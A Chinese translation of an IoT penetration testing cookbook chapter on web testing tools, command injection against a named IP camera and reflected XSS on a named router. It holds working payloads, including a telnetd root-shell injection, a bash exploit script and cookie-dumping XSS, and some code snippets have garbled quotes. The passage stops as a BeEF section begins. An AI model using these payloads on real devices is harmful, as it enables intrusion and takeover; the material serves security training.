# IOT 渗透测试秘籍（二）

> 原文：[`annas-archive.org/md5/897C0CA0A546B8446493C0D8A8275EBA`](https://annas-archive.org/md5/897C0CA0A546B8446493C0D8A8275EBA)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第四章：利用嵌入式 Web 应用程序

在本章中，我们将涵盖以下内容：

+   开始进行 Web 应用程序安全测试

+   使用 Burp Suite

+   使用 OWASP ZAP

+   利用命令注入

+   利用 XSS

+   利用 CSRF

# 介绍

Web 应用程序和 Web 服务用于执行远程访问功能以及管理设备。Web 应用程序和 IoT 设备可以赋予大量的权力，使攻击者能够远程执行控制。某些产品，如连接的车辆或具有远程可执行漏洞的智能门锁，可能会对用户造成伤害和个人安全风险。在测试 IoT 产品的上述类别时，首先要针对对用户造成最高风险和影响的漏洞进行定位。在本章中，我们将展示如何选择 Web 应用程序测试方法论，设置您的 Web 测试工具包，以及讨论如何发现和利用一些最常见的嵌入式 Web 应用程序漏洞。

# 开始进行 Web 应用程序安全测试

现代 Web 的大部分运行在数百个 Web、应用程序和数据库服务器后面作为其后端系统的应用程序上。Web 已经从静态 HTML 页面发展到需要更多资源来计算的复杂的异步应用程序。尽管 Web 已经发生了变化，但一些最常见的安全问题仍然存在。在 1990 年代首次发现的漏洞仍然是相关的，并且正在积极被利用。在 IoT 产品中，一些常见的漏洞通常是命令注入、**跨站脚本**（**XSS**）、目录遍历、身份验证绕过、会话劫持、**XML 外部实体**（**XXE**）、**跨站请求伪造**（**CSRF**）和其他业务逻辑缺陷。在这个方法中，我们将建立一个 Web 应用程序测试方法论，用于发现和利用 IoT Web 应用程序和 Web 服务的漏洞。

# 如何做…

要开始评估 Web 应用程序，建立方法论甚至一份清单是很重要的，一旦您掌握了一些技巧。了解您的方法和上下文应用风险对于成功破坏安全控制至关重要。在我们建立与目标应用程序相关的方法论之后，我们将开始配置我们的 Web 测试环境和工具包，以开始进行 Web 应用程序安全测试。

# Web 渗透测试方法

除了网络渗透测试方法之外，还有许多其他的渗透测试方法。并不存在绝对正确或错误的方法论；然而，建立测试应用程序的方法对于成功发现软件缺陷至关重要。最常见的方法论是**渗透测试执行标准**（**PTES**）和 OWASP 的 Web 应用程序渗透测试方法论。**开放式 Web 应用安全项目**（**OWASP**）是一个非营利性慈善组织，提供工具和文件，并在国际上倡导软件安全。如果您曾经测试过一个应用程序或不得不修复软件漏洞，您可能已经熟悉 OWASP。如果您曾经进行过渗透测试，您可能也遇到过 PTES。PTES 旨在为渗透测试提供一个基准。PTES 将渗透测试定义为包括以下七个阶段的测试：

1.  预交互

1.  情报收集

1.  威胁建模

1.  漏洞分析

1.  利用

1.  后期利用

1.  报告

尽管 PTES 与信息安全测试的所有领域相关，但它最常用于面向网络的渗透测试。虽然有关 Web 安全的小节，但目前还不足以进行成功的评估。PTES 确实为方法论的每个阶段提供了详细的实际示例，并包括工具使用示例。另一方面，OWASP 的 Web 应用程序渗透测试方法论纯粹针对 Web 应用程序渗透测试。OWASP 的 Web 应用程序渗透测试方法论包括以下 12 个类别：

+   介绍和目标

+   信息收集

+   配置和部署管理测试

+   身份管理测试

+   身份验证测试

+   授权测试

+   会话管理测试

+   输入验证测试

+   错误处理

+   密码学

+   业务逻辑测试

+   客户端测试

与 PTES 类似，OWASP 的测试方法提供了每个阶段的许多示例，包括屏幕截图以及工具参考和用法。当某些领域的经验较低时，具有与测试目标应用程序相关的示例是有帮助的。OWASP 测试方法的一大优点是提供了特定测试方法的上下文，以尝试用例和测试视角，例如黑盒或灰盒。OWASP 被认为是应用程序安全指南和测试的事实标准组织。如果有疑问，请查看 OWASP 测试指南或它们的各种小抄系列以寻求帮助。

# 选择您的测试工具

有许多可用于测试 Web 应用程序的工具。组装用于评估 Web 应用程序的工具箱的第一步将是选择浏览器并自定义其配置以进行测试。由于其许多可用的测试附加组件，常用于测试的浏览器是 Firefox。也可以使用其他浏览器，并且可能需要一些应用程序，例如使用 ActiveX 或 Silverlight 的应用程序，需要 Internet Explorer 浏览器才能运行。一些附加组件使测试变得更加轻松和高效。常用的有用附加组件包括以下内容：

+   **FoxyProxy**：用于管理 Chrome 和 Firefox 的浏览器代理设置的工具。有时您可能同时运行多个代理工具，并且可能需要在两者之间切换。FoxyProxy 可以帮助更改代理设置，而无需点击多个浏览器设置菜单。FoxyProxy 可以在[`addons.mozilla.org/en-us/firefox/addon/foxyproxy-standard/`](https://addons.mozilla.org/en-us/firefox/addon/foxyproxy-standard/)下载。

+   **Cookie Manager+**：Cookie 管理器对于编辑 cookie 值和查看其属性非常有用。有许多适用于 Firefox 和 Chrome 的 cookie 管理器附加组件。Firefox 的常见 cookie 管理器是 Cookie Manager+。Cookie Manager+可以在 https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/下载。

+   **Wappalyzer**：为了更好地了解目标应用程序，了解正在使用的组件是很有帮助的。Wappalyzer 是一个附加组件，可帮助揭示正在使用的技术，包括 Web 服务器、框架和 JavaScript 库。Wappalyzer 可以在 https://wappalyzer.com/download 下载到 Firefox 和 Chrome。

选择浏览器后，必须配置代理设置，以便在 Web 应用程序代理工具中查看应用程序的请求和响应。在接下来的步骤中，我们将介绍配置代理设置和 Web 应用程序代理工具。

# 使用 Burp Suite

Burp Suite 是用于评估 Web 应用程序的最流行的 Web 代理工具之一。Burp 是基于 Java 的跨平台工具。使用 Burp Suite，可以中间人攻击 HTTP 请求和响应，以便篡改并监视应用程序行为。此外，应用程序可以进行蜘蛛爬行，主动扫描漏洞，被动扫描和模糊处理。

# 准备就绪

Burp Suite 已经预装在为本书准备的虚拟机中；但是，也可以在[`portswigger.net/burp/`](https://portswigger.net/burp/)上下载。

Burp 有两个版本：免费版和专业版。专业版的价格适中（349.00 美元），考虑到 Burp 的功能集。还有一个为期 2 周的专业版试用版。免费版允许代理 HTTP 请求和响应，以及下载 BApp 商店中的一些扩展插件。专业版允许使用更高级的功能和专业的扩展插件。

# 如何做…

我们将介绍 Burp Suite 的基本用法，以开始测试嵌入式 Web 应用程序。以下示例将使用 Burp Suite 专业版；但是，相同的设置步骤也适用于免费版：

1.  设置 Burp 代理监听器设置为`127.0.0.1`，端口为`8080`，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5ab04475-9738-48f9-8a02-ca5f7d2f8aea.png)

1.  使用 FoxyProxy 将浏览器代理设置为我们在上一步中设置的 Burp Suite 监听器地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/1c75e385-9c69-413c-874b-2d40f9c6f692.png)

1.  选择配置的代理以将所有流量路由到我们的 Burp 代理监听器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/16663d82-4c91-462f-9392-9b3cb8c7f417.png)

1.  接下来，我们需要下载并安装 Burp 的 CA 证书，方法是转到`http://burp/cert`，将证书保存在一个文件夹中，并将证书导入浏览器的证书管理器中。导入 Burp 的 CA 证书允许代理 HTTPS 连接，这在将来可能会派上用场：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/d394bec0-e6a7-407c-8484-4109e37db384.png)

1.  在 Firefox 中导航到`about:preferences#advanced`，选择证书，然后选择授权机构：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f38711f7-1d8b-42db-95b0-d2cdc78ab708.png)

1.  单击“导入…”按钮，然后选择本地保存的 Burp Suite 证书：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0468ca2b-36b5-455f-996e-3c5ec8af99a0.png)

现在我们可以查看 HTTP/HTTPS 请求和响应。

1.  一旦我们为浏览器和 Burp Suite 配置了基本代理设置，就导航到目标 Web 应用程序。右键单击其地址并选择添加到范围，将我们的目标应用程序添加到范围，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/053deda8-7603-4721-a3c8-4070db6fc438.png)

1.  选择范围后，可以通过右键单击请求并选择执行主动扫描来使用 Burp 的扫描引擎扫描请求：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/32fb5ab3-dcb5-4fa2-aaea-03be79890bf6.png)

1.  通过导航到扫描队列查看扫描结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/c01b5144-1b24-4680-b86e-d91a1303f322.png)

1.  有时，我们可能希望使用重复器重放请求，以观察应用程序响应或调整有效载荷。这可以通过右键单击目标请求并将其发送到重复器来完成。以下截图显示了使用有效载荷调整`alias`参数：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5faec337-291f-4c7c-b1b9-ced6e1550d6c.png)

1.  在调整有效载荷的过程中，我们可能需要对某些字符进行编码或解码，以确保我们的有效载荷能够使用 Burp Suite 的解码器执行。以下截图显示了一个解码值（顶部）被 URL 编码（底部）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/02b7e4ff-8973-45ff-b9ad-319f891921b6.png)

1.  使用 Burp Suite 的入侵者可以以更手动的方式对具有特定目标有效载荷的参数进行模糊处理。首先，需要指定一个目标参数。在这种情况下，我们使用`alias`参数作为目标：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/c9d6df39-b119-4c59-b10d-316a208dee36.png)

1.  接下来，选择要使用的攻击有效载荷（在本例中为 Fuzzing - XSS），然后单击开始攻击：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/be2b63cd-033d-4fee-90d1-14cfaffacd59.png)

将会弹出一个单独的窗口，攻击结果将可见：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/dbd3005f-0a49-4206-b819-f8c10c75bd27.png)

# 它是如何工作的…

在我们的设置步骤中，我们配置了 Burp 代理设置和浏览器设置，并学习了将用于测试的 Burp Suite 的基础知识。我们使用 FoxyProxy 配置了浏览器代理设置，安装了 Burp 的 CA 证书，扫描了一个请求，并展示了如何使用其他可能有助于更多目标攻击的 Burp 工具，比如 Repeater、decoder 和 Intruder。

有了这些知识，我们现在可以开始使用 Burp Suite 访问嵌入式 Web 应用程序，以查找目标设备上的漏洞。

# 还有更多...

Burp Suite 有一个强大的社区支持。当发现新的攻击技术时，社区会创建许多附加扩展。Burp Suite 本身也是如此。PortSwigger 通过不断更新 Burp 来保持领先地位。看看各种发布说明，你可能会学到一两件事情（[`releases.portswigger.net/`](http://releases.portswigger.net/)）。

# 有用的入侵者有效载荷

在使用 Intruder 时，最好准备一组用于模糊参数的有针对性的有效载荷。SecList 项目有许多单词列表以及用于更有针对性攻击的模糊有效载荷。该项目定期更新，社区贡献有助于测试。SecList 存储库可以通过 URL [`github.com/danielmiessler/SecLists/`](https://github.com/danielmiessler/SecLists/)找到。

# 另请参阅

+   如果你发现自己需要为定制目的创建宏或附加组件，请查看 Burp 的可扩展 API，网址为[`portswigger.net/burp/extender/`](https://portswigger.net/burp/extender/)。

# 使用 OWASP ZAP

OWASP **Zed Attack Proxy** (**ZAP**)是一个免费的跨平台 Web 代理测试工具，用于发现 Web 应用程序中的漏洞。ZAP 在 Web 应用程序代理测试工具领域是 Burp Suite 的紧密竞争对手，当你的预算可能不足以购买商业产品的许可证时，ZAP 绝对是一个不错的选择。ZAP 旨在供具有广泛安全经验的人使用，因此也非常适合开发人员以及对渗透测试新手的功能测试人员。借助 ZAP 的 API，扫描可以自动化，并在开发人员的工作流程中用于在生产之前扫描构建。ZAP 有许多不同的有用附加组件，具有强大的扫描引擎，其中包括引擎内的其他经过验证的测试工具，如 Dirbuster 和 SQLmap。此外，ZAP 还有一种名为 ZEST 的图形化脚本语言，可以记录和重放类似于宏的请求。本教程将介绍用于 Web 应用程序安全测试的基本 ZAP 功能。

# 准备工作

Burp Suite 预装在为菜谱准备的虚拟机中；但是，也可以通过[`github.com/zaproxy/zaproxy/wiki/Downloads`](https://github.com/zaproxy/zaproxy/wiki/Downloads)下载。

ZAP 下载页面包含额外的 Docker 镜像，以及利用新功能的 ZAP 每周版本，这些功能在官方版本中尚未引入。每周版本非常稳定，如果您希望获得更多的可扩展性，我建议您尝试一下。

# 如何做...

以下步骤将介绍 ZAP 的设置和基本用法：

1.  通过单击“工具”，然后单击“选项”来设置 ZAP 代理监听器设置。输入 ZAP 要监听的 IP 和端口信息，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/fb263bcd-8773-464d-92c6-1b7bc38bd6d1.png)

1.  通过动态 SSL 证书选项生成和安装 ZAP 的 CA 证书，并在浏览器中安装证书，类似于你在 Burp Suite 教程中所做的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/71c9b102-a12e-4392-9a2d-9390a01c450a.png)

1.  将证书保存在已知目录中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/6e52f310-3823-4d8b-9587-4b93a9612454.png)

1.  有必要安装附加组件来协助主动和被动的网络渗透测试。这些附加组件包括高级 SQL 注入扫描器、主动扫描规则（alpha）、DOM XSS 主动扫描规则、被动扫描规则（alpha）和使用 Wappalyzer 进行技术检测。ZAP 的附加组件有不同的成熟度级别，但使用 alpha 级别的附加组件并不会有害。下面的截图说明了必要的附加组件：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/bfd962bc-aedd-46c3-8dbf-047275b0e390.png)

1.  安装了所需的附加组件后，现在可以通过分析和扫描策略管理器选项来配置扫描策略。这些策略也可以导出和导入。下面的截图显示了一个用于 XSS 的示例扫描策略：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/8d08cc6f-ac66-405b-9e02-ef621a203ac1.png)

ZAP 的扫描策略包含阈值和强度。阈值涉及警报的置信度以及 ZAP 报告潜在漏洞的可能性。强度涉及 ZAP 执行攻击的数量。这些信息可以在 ZAP 的用户指南中找到，该指南位于工具本身或在线[`github.com/zaproxy/zap-core-help/wiki`](https://github.com/zaproxy/zap-core-help/wiki)。

1.  配置了我们的扫描配置后，我们需要通过右键单击目标将目标站点添加到上下文中，如下面的截图所示。这类似于 Burp 的“添加到范围”功能：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/88e0ab44-58cc-483d-b55c-8192fc0e7488.png)

1.  现在目标已经包含在扫描上下文中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/63ac437e-c29e-4d52-bb9a-fbf1f55d6fd5.png)

1.  扫描请求是通过右键单击目标请求，选择扫描策略，并开始扫描来完成的，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/335ee3fc-f922-4ea2-bd9b-7fe33af67715.png)

选择了 XSS 扫描策略，现在扫描将开始，并且扫描的输出将显示在 ZAP 的“主动扫描”选项卡中。

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5bf5c0a4-3580-4a5a-a47c-7184e178c0d8.png)

1.  为了更有针对性地进行主动扫描，可以利用 ZAP 的模糊测试功能，这类似于 Burp 的 Intruder。要进行模糊测试，请右键单击请求并选择模糊测试位置和有效载荷，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5f7d9c14-7016-4d24-856e-fd6e7ff3f692.png)

1.  解码和编码字符对于代码执行至关重要。ZAP 的编码器/解码器，可通过工具菜单访问，与 Burp 的解码器类似，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f46f40f5-8bc5-42bc-abf8-a8a7fdf353b1.png)

# 还有更多...

ZAP 非常可定制和可扩展；我们上一个示例只涵盖了 ZAP 的基本用法，以帮助进行 Web 应用程序安全测试。要了解更多关于使用和定制 ZAP 的信息，请访问 ZAP 的博客以及他们的维基，网址为[`github.com/zaproxy/zaproxy/wiki`](https://github.com/zaproxy/zaproxy/wiki)和[`zaproxy.blogspot.com/`](https://zaproxy.blogspot.com/)。

此外，如果您想要通过 ZAP 或 Burp Suite 来提高您的网络应用程序测试技能，请查看 OWASP 的易受攻击的 Web 应用程序目录项目，网址为[`www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project`](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)。

# 利用命令注入

在嵌入式系统中，OS 命令注入是一种常见的漏洞，通常通过 Web 界面或调试页面留下来自开发固件构建的方式来执行任意操作系统命令。用户通过 Web 界面在 Web 服务参数中提供操作系统命令，以执行 OS 命令。动态且未经适当清理的参数容易受到此漏洞的利用。通过执行 OS 命令的能力，攻击者可以上传恶意固件，更改配置设置，获得对设备的持久访问权限，获取密码，攻击网络中的其他设备，甚至锁定合法用户对设备的访问。在这个步骤中，我们将演示如何利用命令注入来获取对设备的 shell 访问权限。

# 准备工作

对于这个步骤，我们将使用 tcpdump、Burp Suite 和一个易受攻击的 IHOMECAM ICAM-608 IP 摄像头。Tcpdump 包含在大多数*Nix 操作系统中，但也可以使用 Wireshark 来观察数据包。

# 如何做...

在嵌入式 Web 应用程序中查找可注入命令的页面的过程相当简单。我们要检查的应用程序中的第一个地方是使用系统命令的诊断页面，比如`ping`或`traceroute`，还有守护程序的配置设置页面，比如 SMB、PPTP 或 FTP。如果我们已经获得了固件或者访问了目标设备的控制台，最好是静态分析设备执行的易受攻击脚本和函数，并验证通过动态分析发现的潜在发现：

1.  让我们来看一下我们目标 IP 摄像头的配置菜单设置，以确定可能存在漏洞的页面：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/9675cb0f-af21-474c-8094-1b0c3c4f8d1d.png)

1.  可选择的页面并不多，但我们看到了邮件服务和 FTP 服务设置页面。这些页面可能会将系统命令输入操作系统以执行。让我们首先检查 FTP 服务设置页面，并尝试通过 Burp Suite 操纵参数值以执行系统命令：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e6c1d0f6-2898-4872-9721-cd5ed3b1054c.png)

1.  在尝试在`pwd`参数中发送有效负载`$(ping%20192.168.1.184)`时，应用程序似乎会剥离字符，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/81a56e3b-bea5-4e4d-b597-4c9d9b98a8b8.png)

1.  使用基本命令，比如`ping`，将有效负载发送到我们的主机计算机，这让我们知道我们的命令已成功执行。为了观察 ping 是否已执行，设置`tcpdump`来监听来自我们目标 IP 摄像头的 ICMP 数据包，使用以下命令：

```
$ tcpdump host 192.168.1.177 and icmp
```

1.  使用 Burp Suite 的 Repeater，我们可以更改数值并绕过 IP 摄像头执行的客户端检查。使用以下请求，我们可以看到应用程序接受了我们的更改，并需要根据 HTTP 响应刷新`ftp.htm`页面：

```
RAW HTTP Request  
GET 
/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=admin&svr=192.168.1.1&port=21&user=ftp&pwd=$(ping%20192.168.1.184)&dir=/&mode=0&upload_interval=0 HTTP/1.1 

RAW HTTP Response 
HTTP/1.1 200 OK 
Server: GoAhead-Webs 
Content-type: text/html 
Cache-Control:no-cache 
Content-length: 194 
Connection: close 

<html> 

<head> 

<title></title> 

<meta http-equ"v="Cache-Cont"ol" conte"t="no-cache, must-reva lid"te"><meta http-equ"v="refr"sh" conte"t="0; url=/ftp."tm" /> 

</head> 

<body> 

</body> 

<html> 
```

1.  刷新到`ftp.htm`页面后，我们观察到 ICMP 数据包被发送到我们的主机计算机：

```
$ tcpdump host 192.168.1.177 and icmp

15:27:08.400966 IP 192.168.1.177 > 192.168.1.184: ICMP echo request, id 42832, seq 0, length 64
15:27:08.401013 IP 192.168.1.184 > 192.168.1.177: ICMP echo reply, id 42832, seq 0, length 64
15:27:09.404737 IP 192.168.1.177 > 192.168.1.184: ICMP echo request, id 42832, seq 1, length 64
15:27:09.404781 IP 192.168.1.184 > 192.168.1.177: ICMP echo reply, id 42832, seq 1, length 64
15:27:10.666983 IP 192.168.1.177 > 192.168.1.184: ICMP echo request, id 42832, seq 2, length 64
15:27:10.667031 IP 192.168.1.184 > 192.168.1.177: ICMP echo reply, id 42832, seq 2, length 64  
```

1.  现在我们知道`pwd`参数容易受到命令注入的攻击，我们的下一个目标是获取对目标设备的 shell 访问权限。我们知道 IP 摄像头包含基于 FTP 的传统守护程序，很可能也使用 Telnet。接下来，我们将调用 Telnet 在端口`25`上启动，并使用以下有效负载在没有用户名或密码的情况下进入 shell：

```
/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=admin&svr=192.168.1.1&port=21&user=ftp&pwd=$(telnetd -p25 -l/bin/sh)&dir=/&mode=PORT&upload_interva'=0'  
```

1.  我们还知道应用程序需要刷新`ftp.htm`页面以保存设置，但是在查看页面源代码时，它调用了一个名为`ftptest.cgi`的 CGI，执行我们的有效负载。以下是从`ftp.htm`页面执行我们的有效负载的代码片段：

```
function ftp_test() {              
   var url;              
   url'= 'ftptest.cgi?next_url=test_ftp.'tm';              
   url '= '&loginu'e=' + top.cookieuser'+ '&loginp's=' + encodeURIComponent(top.cookiepass);              
   window.open(ur"" """ "")         } 
```

1.  接下来，我们可以直接调用`ftptest.cgi`来保存我们的设置，使用以下`GET`请求：

```
/ftptest.cgi?next_url=test_ftp.htm&loginuse=admin&loginpas=ad'in'  
```

1.  Telnet 现在在端口`25`上运行，并给我们一个 root shell：

```
$ telnet 192.168.1.177 25
Trying 192.168.1.177...
Connected to 192.168.1.177.
Escape character 's '^]'.

/ # id
uid=0(root) gid=0
/ # mount
rootfs on / type rootfs (rw)
/dev/root on / type squashfs (ro,relatime)
/proc on /proc type proc (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
tmpfs on /dev type tmpfs (rw,relatime,size=2048k)
tmpfs on /tmp type tmpfs (rw,relatime,size=5120k)
devpts on /dev/pts type devpts (rw,relatime,mode=600,ptmxmode=000)
/dev/mtdblock3 on /system type jffs2 (rw,relatime)
/ # uname -a
Linux apk-link 3.10.14 #5 PREEMPT Thu Sep 22 09:11:41 CST 2016 mips GNU/Linux

```

1.  在设备的 LAN 上获得 shell 权限后，可以使用各种技术进行后期利用。本教程不涵盖后期利用技术；然而，我们可以轻松地编写命令注入有效负载的脚本，以确保使用以下 bash 脚本访问：

```
#!/bin/sh  
wget -q'- 'http://192.168.1.177/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=admin&svr=192.168.1.1&port=21&user=ftp&pwd=$(telnetd -p25 -l/bin/sh)&dir=/&mode=PORT&upload_interval=0'  
wget -qO- 'http://192.168.1.177/ftptest.cgi?next_url=test_ftp.htm&loginuse=admin&loginpas=admin' 
telnet 192.168.1.177 25  
```

在这个教程中，我们介绍了在 IHOMECAM ICAM-608 IP 摄像头上发现和利用命令注入。我们能够获得 shell 访问权限，并创建一个脚本来自动化利用命令注入。

# 另请参阅

+   要了解更多关于查找和预防命令注入的信息，请参考 OWASP 的命令注入维基页面（[`www.owasp.org/index.php/Command_Injection`](https://www.owasp.org/index.php/Command_Injection)）以及 OWASP 的嵌入式应用安全项目（[`www.owasp.org/index.php/OWASP_Embedded_Application_Security`](https://www.owasp.org/index.php/OWASP_Embedded_Application_Security)）。

# 利用 XSS

XSS 是一种攻击类型，它从不受信任的来源执行和注入任意 JavaScript 到受信任网站的上下文中。当攻击者发现 Web 应用程序中存在一个漏洞参数，可以在不验证或输出编码字符的情况下执行动态内容并将内容呈现给用户时，XSS 攻击就会发生。XSS 攻击利用浏览器的能力传输攻击有效负载，因为浏览器认为代码是受信任的。XSS 漏洞有三种类型：反射型（最常见），存储型和基于 DOM 的。反射型 XSS 漏洞是在不对内容进行消毒的情况下，将参数数据复制并回显到应用程序的响应中产生的。存储型 XSS 漏洞是当应用程序允许将参数输入数据存储在应用程序的数据库中以供以后使用时产生的。**文档对象模型**（**DOM**）XSS 漏洞是当来自参数的数据通过 JavaScript 函数被馈送到 DOM 元素中时产生的。

成功利用 XSS 的攻击者可以做到以下几点：

+   关键日志数据

+   攻击受害者的本地区域网络（LAN）

+   将所有 Web 流量代理通过受害者，称为**浏览器中间人**（**MITB**）

+   窃取或修改应用程序的 cookie 以进行会话劫持

+   修改受害者应用程序的外观

+   绕过 CSRF 安全控制

要成功攻击受害者，攻击者需要执行某种社会工程技术，以使用户执行恶意请求。XSS 攻击的常见社会工程方法包括以下几种：

+   创建一个带有恶意 JavaScript 的假网站，并链接到其页面

+   发送嵌入恶意 Web URL 的电子邮件

+   使用 URL 缩短器掩盖 URL

在每种情况下，初始 URL 将链接到受信任的受害者网站，并且将在用户不知情的情况下异步执行恶意 JavaScript 代码。在这个教程中，我们将介绍发现和利用反射型 XSS 漏洞，从而完全控制受害者浏览器。

# 准备工作

对于这个教程，我们将使用 OWASP ZAP，**浏览器利用框架**（**BeEF**）和一个易受攻击的 RT-N12 ASUS 路由器。BeEF 可以通过[`beefproject.com`](http://beefproject.com)安装，或者在默认安装了 BeEF 的 Kali Linux 虚拟机中使用。

# 如何做...

在尝试查找反射型 XSS 漏洞时，我们首先观察参数输入行为，看数据是否反射回用户。OWASP ZAP 和 Burp Suite 等 Web 代理可以帮助自动化发现过程，使用它们的扫描引擎：

1.  浏览应用程序以查找潜在的反射值。通常可以探测的地方是诊断页面、故障排除或更改嵌入式设备上运行的服务或守护进程的配置页面。以下屏幕截图显示了发现 Web 漏洞的潜在起点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/d8c989d0-42ca-4330-a072-d11264aaf784.png)

1.  代理 ZAP 中的 HTTP 请求，并对此页面的配置进行更改。您应该看到 POST 主体参数如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/7633b956-938c-4db3-94b1-b10db94b9ad5.png)

1.  审查`start_apply.htm`源代码，发现一些可能通过连接 JavaScript 代码进行操作的动态变量。这些变量似乎是作为请求的`POST`主体发送的参数，但也可以通过`GET`请求发送。以下是`start_apply.htm`中`next_page`的可能可注入参数值的片段：

```
setTimeout("top_delay_redirect('"+next_page+"');", restart_time*1000);
<snip>
setTimeout("parent.parent.location.href='"+next_page+"';", (restart_time+2)*1000);
<snip>
else if(next_page.length > 0){
setTimeout("delay_redirect('"+next_page+"');", restart_time*1000);

```

使用 XSS 负载的模糊参数，我们可以手动注入 XSS 负载并观察响应，但我们也可以利用诸如 SecLists 之类的已知 XSS 负载与单词列表，以加快发现过程。

1.  根据 ZAP 中的模糊结果，我们在 HTTP 响应中看到了一些反射参数，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/23539223-f5c8-4c98-9e52-1b719528c184.png)

1.  我们可以看到`next_page`参数反映了我们精确的模糊输入值(`<script>(document.head.childNodes[3].text)</script>`)，如下 HTTP 响应片段所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/ba67e021-85c2-4b02-bfb1-129fbfaa864d.png)

1.  让我们手动在浏览器中输入这个反射参数，观察其响应：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5c82cc2b-d804-4f6d-aa3c-7e240e775c8b.png)

根据响应，我们似乎破坏了一些 JavaScript 代码。这可能与负载的编码或可能的长度有关。我们需要调整编码字符并审查 JavaScript 代码，确保我们的代码开始或结束一个可能正在使用的函数。

1.  使用基本的警报 XSS 负载进行发现时，请记住在`start_apply.html`源代码中，参数值的形式如下：

```
'"+next_page+"'
```

1.  让我们使用 ZAP 的编码器/解码器工具来调整我们的基本 XSS 负载，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/f2e101c9-017b-42b6-87b1-7653dc17fec7.png)

1.  通过 Web 界面将 URL 编码值插入易受攻击的参数，现在我们的警报代码成功执行。最好先尝试在警报框中插入一个整数，看看我们的代码是否先执行，然后再深入研究更复杂的 XSS 负载：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e4fa7004-3f96-47af-97b7-4c17d1fb1c83.png)

1.  现在让我们更进一步，使用以下负载在警报框中转储任何 cookie：

```
'%2balert(document.cookie)%2b'
```

1.  现在我们可以看到在我们的浏览器中呈现出`IoTCookbook=1234567890`的 cookie 值，使用基本的`alert(document.cookie)`负载：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/5917c0dd-44e6-4ceb-98bc-7d0962aa5415.png)

太棒了！我们现在知道我们可以在这一点上进行一些基本的 XSS 负载。幸运的是，我们还没有遇到任何字符限制或任何类型的过滤。让我们看看我们是否可以造成更多的损害，并将 BeEF 钩负载插入到易受攻击的参数中。毕竟，警报框会带来什么风险呢？

# 使用 BeEF XSS 负载的介绍

BeEF 是一个利用 Web 浏览器和客户端攻击向量的工具，通过易受攻击的应用程序参数和社会工程技术在受害者环境中钩取一个或多个 Web 浏览器。当受害者执行了它的负载时，BeEF 将钩取一个或多个 Web 浏览器，然后可以利用多个命令模块进行进一步的利用。接下来的部分将扩展我们发现的 XSS 漏洞，使其执行 BeEF 钩，并介绍一些基本用法。

BeEF 很强大，展示了 XSS 的影响力：

1.  现在我们已经演示了基本的 XSS 负载执行，我们将尝试使用类似格式的 BeEF 负载进行`GET`请求：

```
